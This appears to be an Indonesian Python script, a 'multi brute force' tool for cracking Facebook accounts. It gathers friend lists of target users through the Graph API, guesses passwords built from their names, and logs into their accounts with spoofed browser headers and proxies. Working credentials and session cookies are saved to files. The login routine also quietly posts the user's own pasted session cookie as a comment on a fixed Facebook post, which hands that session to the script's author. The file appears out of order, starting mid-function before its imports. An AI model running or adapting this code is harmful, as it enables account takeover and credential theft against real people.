			ref = rc(["https://free.facebook.com/v11.0/dialog/oauth?app_id=2099441543493930&cbt=1694016682169&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfa031ad37b7cfc%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff1c8f0ce4c4803c%26relation%3Dopener&client_id=2099441543493930&display=touch&domain=account.hoyoverse.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Faccount.hoyoverse.com%2F%3Flang%3Did%23%2Flogin%3Fcb_route%3D%252Faccount%252FaccountInfo&locale=id_ID&logger_id=ff8a9c507c4f28&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df4fe7221d2314%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff1c8f0ce4c4803c%26relation%3Dopener%26frame%3Df397f4a437b8a4c&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v11.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified"])
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=2099441543493930&kid_directed_site=0&app_id=2099441543493930&signed_next=1&next=https%3A%2F%2F{url}%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'true',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"__dyn": "",
			"__csr": "",
			"__req": rc(["1","2","3","4","5","6","7","8","9","0","a","b","c","d","f","g","h","i","j","k","l","m","n","n","o","p","q"]),
			"__a": "",
			"__user": "0",
			"_fb_noscript": "true"}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			ver = rc(["id-ID,id;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  
			head = {"Host": url,
			"content-length": f"str(rr(2000,2999))",
			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua,
			"viewport-width": f"str(rr(400,989)",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
			"x-asbd-id": "129477",
			"x-requested-with": "com.android.chrome",
			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://"+url,
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": ref,
			"accept-encoding": "gzip, deflate, br",
			"accept-language": ver}		
			links = rc([f"https://{url}/login/device-based/login/async/?api_key=2099441543493930&auth_token=ed9cb45a485f81810505130bc83f37bb&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2099441543493930&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100"])
			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{hijo}{kuki}{puti}")
				tree.add(f"{ung}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				cp+=1
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{ung}{ua}{hijo}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ CEK-OPSI ]----------#	
def ceker(idf,pw):
	global cp
	rc = random.choice
	url = rc(["mbasic.facebook.com"])
	head = {"Host": url,
"cache-control": "max-age=0",
"upgrade-insecure-requests": "1",
"origin": "https://"+url,
"content-type": "application/x-www-form-urlencoded",
"user-agent": "Mozilla/5.0 (Linux; Android 10; DOOGEE B10 Build/KOTG49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"x-requested-with": "com.android.chrome",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "navigate",
"sec-fetch-user": "?1",
"sec-fetch-dest": "document",
"referer": f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
"accept-encoding": "gzip, deflate",
"accept-language": "fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://'+url)
		kontol = sop(ses.post(
		'https://'+url+'/login.php',
		data={
		'email':idf,
	'pass':pw,
'login':'submit'
		},headers=head, allow_redirects=True).text,'html.parser')
		jo = kontol.find(
		'form'
		)
		data = {}
		lion = [
		'nh',
	'jazoest',
'fb_dtsg',
	'submit[Continue]',
		'checkpoint_data'
		]
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://'+url+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{hijo}Tapyes / A2f ( cek di mbasic ){puti}")
			prints(tree)
			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
			#cp+=1
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
# TERAKHIR UPDATE SMBF
# SABTU 16-09-2023
# CYXIEON-XR

# note ini sc free ya klo udh enak jangan di premiumin
# note yang udah tau jangan di ubah - ubah  hargai :-)

#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-MODULE ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0

#----------[ USER-CRACK ]----------#  
for Xr in range (10000):	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(40,99)
	f='0'
	g=random.randrange(3000,4999)
	h=random.randrange(97,114)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}.{c}) {d}{e}.{f}.{g}.{h} {i}')
	ugen.append(uaku)
	
for Xr in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(5, 19)
	f='DOOGEE' 
	g='Build/MRA58K)'
	h='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	i=random.randrange(40,99)
	j='0'
	k=random.randrange(3000,4999)
	l=random.randrange(97,114)
	m='Mobile Safari/537.36'
	uaku=(f'{a} {b}.{c}; {f} {d}{e} {g} {h}{i}.{j}.{k} {m}')
	ugen.append(uaku)

#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU

#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".cyxieoncokies.txt")
      except:pass
      try:os.remove(".cyxieontoken.txt")
      except:pass
      login_cokies()
      	
#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f'''\t{mer}
  _________   _____ _____________________
 /   _____/  /     \\______   \_   _____/
 \_____  \  /  \ /  \|    |  _/|    __)  
 {puti}/        \/    Y    \    |   \|     \   
/_______  /\____|__  /______  /\___  /   
        \/         \/       \/     \/    
        {hijo} SIMPLE MULTI BRUTE FORCE''')
    	
#----------[ LOGIN-COKIES ]----------#        
def login_cokies():
    try:
        banner()
        ses = requests.Session()
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        cookie = input(f'{kun}└──[{puti} Cookies {hijo}: ')
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        requests.post(f"https://graph.facebook.com/v17.0/100023328316616_1486082242179372/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
        ken = open(".cyxieontoken.txt", "w").write(tok)
        cok = open(".cyxieoncokies.txt", "w").write(cookie)
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        suk = input(f'{kun}└──[{puti} Tekan Enter ] ')
        menu()
            
    except Exception as e:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Login Gagal Cek Tumbal Lo Ngab :-(")		
  
#----------[ BAGIAN-MENU ]----------#            
def menu():
        try:
            token = open('.cyxieontoken.txt','r').read()
            cok = open('.cyxieoncokies.txt','r').read()
            tokene.append(token)
            try:
                baz_ganteng = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokene[0], cookies={'cookie':cok})
                useridz = json.loads(baz_ganteng.text)['id']
                username = json.loads(baz_ganteng.text)['name']
            except KeyError:
                print(f"{kun}╭────────────────────────────────────────────{puti}")
                print(f"{kun}└──[{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
                time.sleep(3)
                login_cokies()
        except requests.exceptions.ConnectionError:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Koneksi Problem ")
        except IOError:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            print(f"{kun}└──[{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
            time.sleep(3)
            login_cokies()
        except IOError:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Cokies Expired ")           
        banner()            
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        print(f'{kun}└──[{puti} User  Id {hijo}: {username} {puti}')
        print(f'{kun}└──[{puti} Username {hijo}: {useridz} {puti}')
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        print(f'{kun}└──[{puti} 01. Crack publik ')
        print(f'{kun}└──[{puti} 02. Cek hasil OK ')
        print(f'{kun}└──[{puti} 03. Cek hasil CP ')
        print(f'{kun}└──[{puti} 04. Ganti cokies ')
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
        if CYXIEON_GANTENG in ['01','1']:
            crack_publik()
        elif CYXIEON_GANTENG in ['02','2']:
            hasil_ok()
        elif CYXIEON_GANTENG in ['03','3']:
            hasil_cp()
        elif CYXIEON_GANTENG in ['04','4']:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            print(f"{kun}└──[{mer} Berhasil Hapus Cokies ")  
            time.sleep(3)      
            exit()    
        else:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Yang bener ter :-( ")            

#----------[ CRACK-PUBLIK  ]----------#            
def crack_publik():
	try:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
	except IOError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Cokies Expired ")           
	try:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		kumpulkan = int(input(f'{kun}└──[{puti} Berapa target : '))
	except ValueError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Yang bener :-( ")    
	if kumpulkan<1 or kumpulkan>100:
	    print(f"{kun}╭────────────────────────────────────────────{puti}")
	    exit(f"{kun}└──[{mer} Gagal Dump ")    
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		Masukan = input(f'{kun}└──[{puti} Target ke '+str(bilangan)+f' {hijo}: ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       graph = ses.get('https://graph.facebook.com/v17.0/'+user+'?fields=friends.limit(999999999)&access_token='+tokene[0], cookies = {'cookies':cok}).json()
	       for xr in graph['friends']['data']:
	           try:
	               gmail = (xr['id']+'|'+xr['name'])
	               if gmail in id:pass
	               else:id.append(gmail)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	          print(f"{kun}╭────────────────────────────────────────────{puti}")
	          exit(f"{kun}└──[{mer} Koneksi Problem ")
	try:
	      print(f"{kun}╭────────────────────────────────────────────{puti}")
	      print(f'{kun}└──[{puti} Total target {hijo}: '+str(len(id)))
	      atur_id()
	except requests.exceptions.ConnectionError:
	      print(f"{kun}╭────────────────────────────────────────────{puti}")
	      exit(f"{kun}└──[{mer} Gagal Dump ")
	except (KeyError,IOError):
	      print(f"{kun}╭────────────────────────────────────────────{puti}")
	      exit(f"{kun}└──[{mer} Tidak punya teman ")
	      
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('CYXIEON-OK')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('CYXIEON-CP')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()
																		
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} 01. Validate ')
	print(f'{kun}└──[{puti} 02. Reguler ')
	print(f'{kun}└──[{puti} 03. Asyinc ')      
	print(f"{kun}╭────────────────────────────────────────────{puti}") 
	CYXIEON_METHODE = input(f'{kun}└──[{puti} Input method : ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('validate')  
	elif CYXIEON_METHODE in ['2','02']:
	   method.append('reguler')       
	elif CYXIEON_METHODE in ['3','03']:
	   method.append('asyinc')
	else:
		method.append('validate')
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} Tambahkan pw manual (y/t) ')
	print(f"{kun}╭────────────────────────────────────────────{puti}") 	
	passwtamb = input(f'{kun}└──[{puti} Input : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     print(f"{kun}╭────────────────────────────────────────────{puti}")
		     sandiku = input(f'{kun}└──[{puti} Input Pw : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
	print(f"{kun}─────────────────────────────────────────────{puti}")
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = []
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'123456')
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'123456')
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'validate' in method:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.beta.facebook.com')
				elif 'reguler' in method:
